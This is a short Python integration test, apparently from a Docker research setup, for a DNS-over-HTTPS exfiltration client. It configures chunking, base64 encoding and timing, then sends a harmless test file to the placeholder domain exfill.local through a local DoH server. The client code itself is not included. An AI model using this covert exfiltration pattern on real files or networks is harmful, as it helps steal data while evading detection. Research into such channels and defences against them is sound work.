#!/usr/bin/env python3
"""
Quick DoH Exfiltration Test

Simple test script for Docker integration verification.
"""

import logging
import os
import sys
import time
from pathlib import Path

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

def test_integration():
    """Test DoH exfiltration integration with existing infrastructure"""
    logger.info("🚀 Starting DoH Exfiltration Integration Test")
    
    # Check environment
    doh_server = os.environ.get('DOH_SERVER', 'https://doh.local/dns-query')
    target_domain = os.environ.get('TARGET_DOMAIN', 'exfill.local')
    
    logger.info(f"DoH Server: {doh_server}")
    logger.info(f"Target Domain: {target_domain}")
    
    try:
        # Import our client
        sys.path.append('/app')
        from client import DoHExfiltrationClient, ExfiltrationConfig, EncodingType, TimingPattern
        
        # Create a simple test file
        test_dir = Path("/app/test_data")
        test_dir.mkdir(exist_ok=True)
        
        test_file = test_dir / "integration_test.txt"
        with open(test_file, 'w') as f:
            f.write("This is a DoH exfiltration integration test.\n")
            f.write("Timestamp: " + str(time.time()) + "\n")
            f.write("Environment: Docker container\n")
            f.write("Test data for academic research purposes.\n")
            f.write("End of test data.\n")
        logger.info(f"Test file created: {test_file}")
        
        logger.info(f"Created test file: {test_file}")
        
        # Create client configuration
        config = ExfiltrationConfig(
            doh_server=doh_server,
            target_domain=target_domain,
            chunk_size=30,
            encoding=EncodingType.BASE64,
            timing_pattern=TimingPattern.REGULAR,
            base_delay=0.2
        )
        
        logger.info("Creating DoH exfiltration client...")
        client = DoHExfiltrationClient(config)
        
        logger.info("Starting exfiltration...")
        success = client.exfiltrate_file(str(test_file))
        
        if success:
            logger.info("✅ Integration test successful!")
            
            # Show statistics
            stats = client.stats
            logger.info("Test Statistics:")
            logger.info(f"  - Total chunks: {stats['total_chunks']}")
            logger.info(f"  - Successful chunks: {stats['successful_chunks']}")
            logger.info(f"  - Failed chunks: {stats['failed_chunks']}")
            logger.info(f"  - Total bytes: {stats['total_bytes']}")
            if stats['end_time'] and stats['start_time']:
                duration = stats['end_time'] - stats['start_time']
                logger.info(f"  - Total time: {duration:.2f} seconds")
            
        else:
            logger.error("❌ Integration test failed!")
            return False
            
    except Exception as e:
        logger.error(f"❌ Integration test error: {e}")
        import traceback
        traceback.print_exc()
        return False
    
    logger.info("🎉 Integration test completed successfully!")
    return True

if __name__ == "__main__":
    success = test_integration()
    sys.exit(0 if success else 1)
